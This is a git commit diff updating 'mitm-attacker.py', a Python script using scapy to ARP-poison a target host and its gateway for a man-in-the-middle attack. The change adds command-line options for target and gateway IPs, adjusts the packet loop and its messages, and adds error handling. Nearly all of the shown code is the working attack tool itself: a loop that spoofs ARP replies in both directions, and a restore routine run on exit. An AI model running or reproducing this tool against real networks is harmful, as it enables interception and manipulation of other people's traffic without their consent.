d454c96f477bba623f3868c5bf9257e5dbb678d7
Buğrahan Y <78935299+Bqrayvzdgn@users.noreply.github.com>
2024-03-22 13:37:52 +0300

    Update mitm-attacker.py

--- mitm-attacker.py
+++ mitm-attacker.py
@@ -1,4 +1,5 @@
 import scapy.all as scapy
+import optparse
 import time
 
 class Banners:
@@ -8,18 +9,22 @@ class Banners:
     ▒█▄▄▄ ▒█░▒█ ▒█░▒█ ▒█▄▄▄█ ▒█░▒█ ▄
     """
 
-    QUIT = """
-    ▒█▀▀▀█ ▒█▀▀▀ ▒█▀▀▀ ▒█░░▒█ ▒█▀▀▀█ ▒█░▒█ 
-    ░▀▀▀▄▄ ▒█▀▀▀ ▒█▀▀▀ ▒█▄▄▄█ ▒█░░▒█ ▒█░▒█ 
-    ▒█▄▄▄█ ▒█▄▄▄ ▒█▄▄▄ ░░▒█░░ ▒█▄▄▄█ ░▀▄▄▀
-    """
-
     LOGO = """
     ▒█▀▀█ ▒█▀▀█ ▒█▀▀█ ▒█▀▀▄ ▒█▀▀▀ ▒█░░▒█ 
     ▒█▀▀▄ ▒█░▒█ ▒█▄▄▀ ▒█░▒█ ▒█▀▀▀ ░▒█▒█░ 
     ▒█▄▄█ ░▀▀█▄ ▒█░▒█ ▒█▄▄▀ ▒█▄▄▄ ░░▀▄▀░
     """
 
+def get_user_input():
+    parse_object = optparse.OptionParser(description="This application was developed by bqrdev.",usage="python mitm-attacker.py -t [Target IP] -g [Gateway IP]")
+    parse_object.add_option("-t", "--target",dest="target_ip",help="Enter Target IP")
+    parse_object.add_option("-g","--gateway",dest="gateway_ip",help="Enter Gateway IP")
+    options = parse_object.parse_args()[0]
+    if not options.target_ip:
+        print("You must specify the Target IP for the attack to start.")
+    if not options.gateway_ip:
+        print("You must specify the Gateway IP for the attack to start.")
+    return options
 
 def get_mac_address(ip):
     arp_request_packet = scapy.ARP(pdst=ip)
@@ -40,25 +45,29 @@ def reset_operation(fooled_ip, gateway_ip):
     scapy.send(arp_response, verbose=False, count=5)
 
 if __name__ == "__main__":
-    number = 0
     print(Banners.LOGO)
-    print("This application was developed by bqrdev.\n")
-    targetIP = input(str("Enter target IP: "))
-    poisonIP = input(str("Enter the IP to poison (Modem, Router): "))
+    number = 0
+    user_ips = get_user_input()
+    user_target_ip = user_ips.target_ip
+    user_gateway_ip = user_ips.gateway_ip
     try:
+        print("The attack is being launched!")
         while True:
-            arp_poisoning(targetIP, poisonIP)
-            arp_poisoning(poisonIP, targetIP)
+            time.sleep(2)
+            arp_poisoning(user_target_ip, user_gateway_ip)
+            arp_poisoning(user_gateway_ip, user_target_ip)
             number += 1
-            print(f"\n\rPackages are being sent from address {targetIP} to address {poisonIP}. " + f"Number of packages {str(number)}", end="")
-            time.sleep(3)
+            print(f"\n\rPackages are being sent from address {user_target_ip} to address {user_gateway_ip} ==> " + f"Number of packages {str(number)}", end="")
+            time.sleep(2)
     except KeyboardInterrupt:
         print("\n\nEverything is being restored to its former state.")
-        reset_operation(targetIP, poisonIP)
-        reset_operation(poisonIP, targetIP)
+        reset_operation(user_target_ip, user_gateway_ip)
+        reset_operation(user_gateway_ip, user_target_ip)
         print("Exiting.")
-        time.sleep(2)
-    finally:
-        print(Banners.QUIT)
+        time.sleep(1)
+    except IndexError:
+        print("\nYou entered the wrong value.")
+        print("Exiting.")
+        time.sleep(1)
 else:
     print(Banners.ERROR)
